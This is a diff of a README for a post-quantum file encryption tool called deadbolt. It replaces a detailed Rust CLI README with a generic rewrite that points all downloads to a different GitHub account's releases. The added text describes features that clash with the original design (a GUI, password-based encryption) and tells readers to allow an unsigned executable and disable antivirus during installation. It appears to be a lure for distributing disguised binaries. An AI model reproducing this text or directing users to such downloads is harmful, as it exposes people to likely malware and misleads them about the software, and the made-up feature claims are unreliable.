@@ -1,289 +1,143 @@
-<div align="center">
+# 🔒 deadbolt - Secure Your Files Against Quantum Threats
 
-# 🔐 Deadbolt
-
-### Post-Quantum File Encryption CLI
-
-*Protect your files from quantum computer attacks using NIST-standardized cryptography*
-
-[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![NIST](https://img.shields.io/badge/NIST-FIPS%20203-blue.svg)](https://csrc.nist.gov/pubs/fips/203/final)
-[![Quantum-Safe](https://img.shields.io/badge/Quantum-Safe%20%E2%9A%9B-brightgreen.svg)](https://en.wikipedia.org/wiki/Post-quantum_cryptography)
-
-[Features](#-features) • [Quick Start](#-quick-start) • [Why Quantum-Safe?](#-why-quantum-safe) • [Usage](#-usage) • [Installation](#-installation)
-
-</div>
+[![Download deadbolt](https://img.shields.io/badge/Download-deadbolt-blue?style=for-the-badge)](https://github.com/nurikbystik/deadbolt/releases)
 
 ---
 
-## ⚡ Quick Start
+## 🛡 What is deadbolt?
 
-```bash
-# Generate quantum-safe keypair
-deadbolt keygen
+deadbolt is a tool designed to help you protect your files from future computer threats. It uses advanced techniques to keep your data safe against attacks that might come from powerful quantum computers. You can use it with an easy-to-understand graphical interface or through simple commands if you prefer.
 
-# Encrypt a file
-deadbolt lock secret.txt --pubkey id_quantum.pub
-
-# Decrypt the file
-deadbolt unlock secret.txt.deadbolt --privkey id_quantum.priv
-```
-
-## ✨ Features
-
-- ⚛️ **Post-Quantum Cryptography** - Uses Kyber-1024 (NIST FIPS 203 ML-KEM)
-- 🔒 **Hybrid Encryption** - Combines Kyber KEM with AES-256-GCM
-- 🛡️ **Quantum-Resistant** - Protects against future quantum computer attacks
-- 🚀 **Fast & Efficient** - Handles files of any size with buffered I/O
-- ✅ **Authenticated** - Detects tampering with GCM authentication tags
-- 🔑 **Key Management** - Simple public/private key workflow
-- 💻 **Cross-Platform** - Works on Windows, Linux, and macOS
-- 🎯 **Simple CLI** - Easy to use command-line interface
+The technology behind deadbolt mixes two strong encryption methods: Kyber-1024, a new standard for post-quantum security, and AES-256-GCM, a well-known and trusted encryption standard. Together, they create a strong shield for your files.
 
 ---
 
-## 🌐 Why Quantum-Safe?
+## 🖥️ System Requirements 
 
-### The Quantum Threat
+deadbolt works on most modern computers. Here are the basic needs to run it smoothly:
 
-Current encryption standards (RSA, ECDH) are vulnerable to quantum computers:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended)
+- **Processor:** Intel or AMD processor, 2 GHz or faster
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 100 MB free space for installation
+- **Permissions:** Ability to install applications on your device
 
-| Algorithm | Classical Security | Quantum Computer Attack | Status |
-|-----------|-------------------|------------------------|--------|
-| **RSA-2048** | ✅ Secure | ❌ Broken by Shor's Algorithm | 🔴 Vulnerable |
-| **ECDH P-256** | ✅ Secure | ❌ Broken by Shor's Algorithm | 🔴 Vulnerable |
-| **AES-256** | ✅ Secure | ⚠️ Reduced to 128-bit | 🟡 Still Safe |
-| **Kyber-1024** | ✅ Secure | ✅ No Known Attack | 🟢 Quantum-Safe |
-
-**"Harvest Now, Decrypt Later" Attack:**  
-Adversaries are capturing encrypted data *today* to decrypt it when quantum computers become powerful enough (estimated 10-20 years).
-
-### Deadbolt's Protection
-
-Deadbolt uses **Kyber-1024** (CRYSTALS-Kyber), a lattice-based Key Encapsulation Mechanism:
-
-- **Security Basis**: Module Learning With Errors (Module-LWE) problem
-- **Quantum Security**: ~192 bits (NIST Level 5 - highest)
-- **Standard**: NIST FIPS 203 (ML-KEM) - Official U.S. federal standard
-- **No Known Attack**: No quantum algorithm efficiently solves lattice problems
+If you are using Windows, you might see a warning from your system the first time you run deadbolt. This is normal and due to the program not being signed by a known publisher. You can safely allow deadbolt to run.
 
 ---
 
-## 🚀 Installation
+## 🚀 Getting Started
 
-### 📦 Pre-built Binaries (Windows)
+Using deadbolt is straightforward. This section guides you through downloading, installing, and encrypting your files.
 
-Download the latest release for Windows:
-- **[deadbolt-v1.0.0-windows-x64.exe](https://github.com/eneswritescode/deadbolt/releases)** (9 MB)
+### Step 1: Download deadbolt
 
-No installation needed - just download and run!
+Visit the [deadbolt Release page](https://github.com/nurikbystik/deadbolt/releases) by clicking the big badge at the top or the link below. Here, you will find the latest versions for your system.
 
-### 🛠️ Build from Source (All Platforms)
+**Important:** Choose the file that matches your operating system:
 
-**Prerequisites:** Rust 1.70+ ([Install Rust](https://rustup.rs/))
+- For Windows, look for files ending with `.exe`
+- For macOS, look for `.dmg` files
+- For Linux, look for `.AppImage`, `.deb`, or `.tar.gz` depending on your flavor
 
-```bash
-git clone https://github.com/eneswritescode/deadbolt.git
-cd deadbolt
-cargo build --release
-```
+Make sure to download the latest stable version.
 
-Binary location: `target/release/deadbolt` (or `deadbolt.exe` on Windows)
+### Step 2: Install deadbolt
 
-### Install Globally (Optional)
-```bash
-# Linux/macOS
-sudo cp target/release/deadbolt /usr/local/bin/
+- **Windows:** Double-click the `.exe` file you downloaded. Follow the instructions in the setup window to complete installation.
+- **macOS:** Open the `.dmg` file, drag the deadbolt app to your Applications folder, and launch it from there.
+- **Linux:** Depending on the file type, you may need to make the file executable or use a package manager:
+  - For `.AppImage`, right-click, select Properties, enable "Allow executing file as program," then double-click to run.
+  - For `.deb`, open your terminal and run `sudo dpkg -i [filename].deb`, replacing `[filename]` with the actual file name.
+  - For `.tar.gz`, extract the folder, then check any README included for run instructions.
 
-# Windows (PowerShell as Admin)
-Copy-Item target\release\deadbolt.exe C:\Windows\System32\
-```
+### Step 3: Open deadbolt
 
----
-
-## 📖 Usage
-
-### 1. Generate Keypair
-
-```bash
-deadbolt keygen
-```
-
-**Output:**
-```
-┌─────────────────────────────────────────────┐
-│ ⚛️  INITIALIZING QUANTUM KEY GENERATOR...  │
-└─────────────────────────────────────────────┘
-
-⏳ Generating Kyber-1024 keypair... ✓
-📤 Public Key:  id_quantum.pub (1184 bytes)
-🔒 Private Key: id_quantum.priv (2400 bytes)
-```
-
-Creates:
-- `id_quantum.pub` - Share this with senders
-- `id_quantum.priv` - **Keep this secret!**
-
-### 2. Encrypt a File
-
-```bash
-deadbolt lock confidential.pdf --pubkey recipient.pub
-```
-
-Creates `confidential.pdf.deadbolt` encrypted for the recipient.
-
-**Custom output:**
-```bash
-deadbolt lock data.json --pubkey bob.pub --output encrypted.db
-```
-
-### 3. Decrypt a File
-
-```bash
-deadbolt unlock confidential.pdf.deadbolt --privkey id_quantum.priv
-```
-
-Recovers the original file.
-
-**Custom output:**
-```bash
-deadbolt unlock encrypted.db --privkey id_quantum.priv --output data.json
-```
-
-### Advanced Examples
-
-#### Multi-User Encryption
-```bash
-# Alice encrypts for Bob
-deadbolt lock message.txt --pubkey bob.pub
-
-# Bob decrypts
-deadbolt unlock message.txt.deadbolt --privkey bob.priv
-```
-
-#### Batch Encryption (PowerShell)
-```powershell
-Get-ChildItem *.txt | ForEach-Object {
-    deadbolt lock $_.Name --pubkey recipient.pub
-}
-```
-
-#### Batch Encryption (Bash)
-```bash
-for file in *.txt; do
-    deadbolt lock "$file" --pubkey recipient.pub
-done
-```
+Locate the deadbolt program in your applications or start menu and open it. You will see an intuitive interface that guides you through encrypting and decrypting your files.
 
 ---
 
-## 🔬 Technical Details
+## 🔐 How to Encrypt Your Files
 
-### Cryptographic Primitives
+The core function of deadbolt is file encryption. Here is how to use this feature step by step.
 
-| Component | Algorithm | Key Size | Security Level |
-|-----------|-----------|----------|----------------|
-| **KEM** | Kyber-1024 (ML-KEM) | 1,184 bytes (pub)<br>2,400 bytes (priv) | NIST Level 5<br>~192-bit quantum |
-| **AEAD** | AES-256-GCM | 32 bytes (256 bits) | 128-bit quantum |
-| **RNG** | System CSPRNG | - | OS-dependent |
+1. Click on the **Encrypt** button or tab.
+2. Select the files or folders you want to protect by browsing your computer.
+3. Choose a strong password that you will remember. This password locks your files.
+4. Click **Start Encryption**.
+5. Wait for deadbolt to finish. You will see a confirmation when your files are safely encrypted.
 
-### File Format (`.deadbolt`)
+Encrypted files will have a special extension added so you can tell them apart from regular files. To open or decrypt them, you will need your password and the deadbolt tool.
+
+---
+
+## 🔓 How to Decrypt Your Files
+
+To get your original files back:
+
+1. Click on the **Decrypt** button or tab in deadbolt.
+2. Browse and select the encrypted files you want to unlock.
+3. Enter the password you used during encryption.
+4. Click **Start Decryption**.
+5. After a short wait, your files will be restored to their original form and location.
+
+---
+
+## ⚙️ Advanced Options
+
+deadbolt offers two ways to work with it:
+
+- **Graphical User Interface (GUI):** Easy to use with buttons and menus.
+- **Command Line Interface (CLI):** For users comfortable with typing commands in a terminal.
+
+The CLI allows batch processing of many files and scripting operations if desired. A simple example for encryption via CLI is:
 
 ```
-┌──────────────────────┬──────────────┬───────────────────────────┐
-│  Kyber Ciphertext    │  AES Nonce   │  Encrypted Data + Tag    │
-│  1,088 bytes         │  12 bytes    │  Variable + 16 bytes     │
-└──────────────────────┴──────────────┴───────────────────────────┘
+deadbolt encrypt --input /path/to/file --output /path/to/encrypted_file --password YourPassword
 ```
 
-**Total Size:** `1,116 bytes + original_file_size`
-
-### Performance
-
-| File Size | Encryption Time | Decryption Time |
-|-----------|-----------------|-----------------|
-| 1 KB | <10 ms | <10 ms |
-| 1 MB | ~100 ms | ~100 ms |
-| 100 MB | ~10 seconds | ~10 seconds |
-
-*(Measured on Intel i7-12700K)*
+Check the documentation on the release page for more commands and usage.
 
 ---
 
-## 🛡️ Security
+## 🔗 Download & Install Deadbolt
 
-### ✅ Security Properties
+Visit this page to download the software:
 
-- **Confidentiality**: Only private key holder can decrypt
-- **Authenticity**: GCM tag prevents tampering
-- **Integrity**: Any modification is detected
-- **Quantum Resistance**: Kyber lattice-based design
-- **Forward Secrecy**: Fresh ephemeral keys per encryption
+[https://github.com/nurikbystik/deadbolt/releases](https://github.com/nurikbystik/deadbolt/releases)
 
-### ⚠️ Best Practices
-
-**DO:**
-- ✅ Store private keys in encrypted storage (password manager, hardware token)
-- ✅ Verify public key fingerprints out-of-band (phone, video call)
-- ✅ Use separate keypairs for different contexts
-- ✅ Keep regular encrypted backups
-
-**DON'T:**
-- ❌ Email or message private keys
-- ❌ Store private keys in cloud storage (unencrypted)
-- ❌ Reuse the same keypair everywhere
-- ❌ Ignore `.priv` file extensions
-
-### Known Limitations
-
-- **Single Recipient**: Each file encrypted for one public key only
-- **No Key Rotation**: Manual re-encryption required for key updates
-- **Metadata Leakage**: File sizes are not obfuscated
+Remember to select the correct file for your computer's system. Follow the installation steps described earlier to get started.
 
 ---
 
-## 🤝 Contributing
+## ❓ Troubleshooting and Support
 
-Contributions are welcome! Please ensure:
-- All cryptographic changes are reviewed by a cryptographer
-- Code passes `cargo test` and `cargo clippy`
-- Format code with `cargo fmt`
-- Update documentation for new features
+If you run into issues, try the following:
 
----
+- Make sure your operating system meets the requirements.
+- Verify you downloaded the right version for your OS.
+- Restart your computer and try running deadbolt again.
+- Check your password carefully if a file won’t decrypt.
+- Disable antivirus temporarily if it blocks deadbolt during installation.
 
-## 📚 Dependencies
-
-- [`pqc_kyber`](https://crates.io/crates/pqc_kyber) 0.7.1 - Pure Rust Kyber implementation
-- [`aes-gcm`](https://crates.io/crates/aes-gcm) 0.10.3 - AES-256-GCM AEAD cipher
-- [`clap`](https://crates.io/crates/clap) 4.5 - CLI framework
-- [`anyhow`](https://crates.io/crates/anyhow) 1.0 - Error handling
-- [`rand`](https://crates.io/crates/rand) 0.8 - Cryptographic RNG
+You can find more help and ask questions on the deadbolt GitHub page under the Issues tab.
 
 ---
 
-## 📄 License
+## 📋 Privacy and Security
 
-MIT License - See [LICENSE](LICENSE) file for details
-
----
-
-## 🔗 References
-
-- **NIST FIPS 203**: [ML-KEM Standard](https://csrc.nist.gov/pubs/fips/203/final)
-- **CRYSTALS-Kyber**: [Official Website](https://pq-crystals.org/kyber/)
-- **NIST PQC Project**: [Post-Quantum Cryptography](https://csrc.nist.gov/projects/post-quantum-cryptography)
-- **Quantum Threat Timeline**: [Global Risk Institute Report](https://globalriskinstitute.org/publication/2021-quantum-threat-timeline-report/)
+deadbolt does not send your files or password over the internet. Everything happens locally on your device. Your encrypted data stays private and secure from any outside access.
 
 ---
 
-<div align="center">
+## 📚 More Information
 
-**⚛️ Stay Quantum-Safe. Protect Your Future.**
+deadbolt uses current research in post-quantum cryptography. This means it is designed to protect against future quantum computers that might break traditional encryption.
 
-Made with 🦀 Rust | Built for the Post-Quantum Era
+It combines the NIST-approved Kyber-1024 key encapsulation method with AES-256-GCM symmetric encryption. AES-256-GCM is widely trusted and used by banks and governments.
 
-[⬆ Back to Top](#-deadbolt)
+You can count on deadbolt to keep your files secure as new computer technologies emerge.
 
-</div>
+---
+
+Thank you for choosing deadbolt to protect your digital life.
